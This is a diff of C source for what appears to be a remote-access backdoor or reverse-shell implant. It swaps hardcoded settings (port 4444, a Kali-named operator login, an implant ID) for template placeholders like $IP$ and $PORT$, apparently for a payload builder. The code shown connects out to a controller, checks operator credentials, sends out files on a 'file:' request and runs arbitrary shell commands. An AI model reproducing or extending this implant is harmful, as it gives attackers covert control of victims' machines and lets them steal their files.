@@ -6,10 +6,10 @@
 #include <unistd.h>
 #include <time.h>
 
-#define PORT 4444
-#define IP_ADDRESS "0.0.0.0"
+#define PORT $PORT$
+#define IP_ADDRESS "$IP$"
 #define BUFFER_SIZE 1048576
-#define ID "1885033496@linux"
+#define ID "$ID$"
 
 int client_socket;
 
@@ -47,8 +47,8 @@ int super_connect() {
 void handle(int suc) {
     char buffer[BUFFER_SIZE];
     char username[256], password[256], msg[BUFFER_SIZE];
-    char expected_username[256] = "badr_eddin@kali";  // replace with your expected username
-    char expected_password[256] = "badr_eddin_linux_x86_64";  // replace with your expected password
+    char expected_username[256] = "$USERNAME$";  // replace with your expected username
+    char expected_password[256] = "$PASSWORD$";  // replace with your expected password
 
     while (suc) {
         memset(buffer, 0, sizeof(buffer));
@@ -64,6 +64,7 @@ void handle(int suc) {
                 write(client_socket, error_msg, strlen(error_msg));
                 continue;
             }
+
             if (strncmp(msg, "file:", 5) == 0) { // check if buffer starts with "file:"
                 char filepath[256];
                 sscanf(msg, "file:%s", filepath); // parse the file path from the buffer
@@ -85,6 +86,7 @@ void handle(int suc) {
                     write(client_socket, "1089f990-3641-4f3c-ace7-cc98f28f9d1d", 36);
                 }
             }
+
             else {
                 // Run the command and capture its output
                 char command_with_redirect[256];
